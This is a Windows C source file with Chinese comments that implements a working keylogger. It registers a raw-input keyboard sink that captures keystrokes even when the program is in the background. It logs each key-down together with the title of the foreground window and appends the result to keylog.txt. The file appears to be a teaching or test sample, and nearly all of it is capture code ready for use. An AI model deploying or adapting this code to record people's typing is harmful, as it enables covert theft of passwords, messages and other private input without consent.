#include "RawInputTest.h"
#include "VirtualKeyToAscii.h"


void Input_ShowError(const char* pszText)
{
	char szErr[MAX_PATH] = { 0 };
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}


// 注册原始输入设备
BOOL Init(HWND hWnd)
{
	// 设置 RAWINPUTDEVICE 结构体信息
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK;
	rawinputDevice.hwndTarget = hWnd;
	// 注册原始输入设备
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		Input_ShowError("RegisterRawInputDevices");
		return FALSE;
	}

	return TRUE;
}


// 获取原始输入数据
BOOL GetData(LPARAM lParam)
{
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	// 获取原始输入数据的大小
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> 普通按键    WM_SYSKEYDOWN --> 系统按键(指的是ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// 记录按键
			SaveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}


// 保存按键信息
void SaveKey(USHORT usVKey)
{
	char szKey[MAX_PATH] = { 0 };
	char szTitle[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = { 0 };
	FILE* fp = NULL;
	// 获取顶层窗口
	HWND hForegroundWnd = ::GetForegroundWindow();
	// 获取顶层窗口标题
	::GetWindowText(hForegroundWnd, szTitle, 256);
	// 将虚拟键码转换成对应的ASCII
	::lstrcpy(szKey, GetKeyName(usVKey));
	// 构造按键记录信息字符串
	::wsprintf(szText, "[%s] %s\r\n", szTitle, szKey);
	// 打开文件写入按键记录数据
	::fopen_s(&fp, "keylog.txt", "a+");
	if (NULL == fp)
	{
		Input_ShowError("fopen_s");
		return;
	}
	::fwrite(szText, (1 + ::lstrlen(szText)), 1, fp);
	::fclose(fp);
}